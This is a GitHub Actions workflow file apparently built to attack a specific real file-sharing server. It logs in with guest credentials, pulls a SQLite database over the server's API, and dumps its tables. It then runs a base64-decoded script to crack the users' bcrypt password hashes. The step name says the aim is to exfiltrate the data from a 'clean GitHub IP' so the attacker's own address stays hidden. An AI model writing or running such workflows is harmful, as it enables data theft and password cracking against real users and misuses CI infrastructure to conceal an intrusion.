name: openlist-sqlite-crack
on:
  workflow_dispatch:
jobs:
  crack:
    runs-on: ubuntu-latest
    steps:
      - name: Re-exfil OpenList artex.sqlite (966KB) + dump+crack user hashes (clean GitHub IP, zero own-IP)
        run: |
          set +e
          B="https://pan.yazinb.icu"
          P="/Artex  直装包  渗透网站专用/data/artex.sqlite"
          LOGIN=$(curl -skS -m 20 -X POST "$B/api/auth/login" -H "Content-Type: application/json" -d '{"username":"guest","password":"guest"}')
          TOKEN=$(echo "$LOGIN" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('data',{}).get('token',''))" 2>/dev/null)
          echo "guest_token_len=${#TOKEN}"
          RAW=$(curl -skS -m 30 -X POST "$B/api/fs/get" -H "Authorization: $TOKEN" -H "Content-Type: application/json" -d "{\"path\":\"$P\"}" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('data',{}).get('raw_url',''))" 2>/dev/null)
          echo "raw_url=[$RAW]"
          curl -skS -m 120 "$RAW" -o /tmp/artex.sqlite -w "  dl artex.sqlite -> HTTP %{http_code} bytes=%{size_download}\n"
          echo "sqlite sha256=$(sha256sum /tmp/artex.sqlite | cut -c1-64) size=$(wc -c < /tmp/artex.sqlite)"
          python3 -c "import sqlite3;c=sqlite3.connect('/tmp/artex.sqlite');print('TABLES',[r[0] for r in c.execute(\"select name from sqlite_master where type='table'\")])"
          echo "CRACK_SCRIPT_BASE64_BEGIN"
          echo '' | base64 -d > /tmp/crack.py
          echo "CRACK_SCRIPT_BASE64_END"
          echo "pip bcrypt (best-effort, may be offline):"
          pip install --quiet bcrypt 2>&1 | tail -2 || echo "pip bcrypt failed"
          echo "===== RUN CRACK ====="
          python3 /tmp/crack.py
          echo "=== DONE ==="
